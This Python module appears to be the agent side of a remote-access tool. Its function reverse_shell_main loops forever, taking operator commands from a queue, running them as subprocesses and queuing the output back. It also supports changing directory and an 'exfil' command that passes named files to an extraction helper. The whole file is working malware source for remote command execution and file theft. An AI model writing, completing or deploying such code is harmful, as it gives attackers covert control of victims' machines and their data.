import os
import subprocess
from queue import Queue
from time import sleep
from ..helper import extract_file
from hashlib import sha256

def hash(filename, algo=sha256, chunk_size: int = 32):
    hash = algo()
    with open(filename, "rb") as file:
        chunk = file.read(chunk_size)
        while chunk:
            hash.update(chunk)
            chunk = file.read(chunk_size)
    return hash.hexdigest()

def is_root():
    return os.getuid() == 0

def reverse_shell_main(command: Queue, result_queue: Queue, sec: int = 2):
    while True:
        sleep(sec)
        cmd = command.get()

        cmd = cmd.replace('"','')

        if cmd.startswith('exfil '):
            filename = cmd.replace('exfil ', '')
            # result_queue.put({'filename': f'{filename} {hash(filename)}', 'data': open(filename, "rb")})
            extract_file(f"{filename}")
        elif 'cd' in cmd:
            #print(f"cd _ test {cmd[3:]}")
            os.chdir(cmd[3:])
            result_queue.put(os.getcwd())
        else:
            print(f"CMD -> {cmd}  {type(cmd)}")
            import shlex
            stdout, stderr =  subprocess.Popen(shlex.split(cmd), stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
            #result = os.popen(cmd).read() # work
            result = stdout
            print(f"DEBUG: {type(result)} - {result}")
            result_queue.put(result.decode('utf-8'))
        
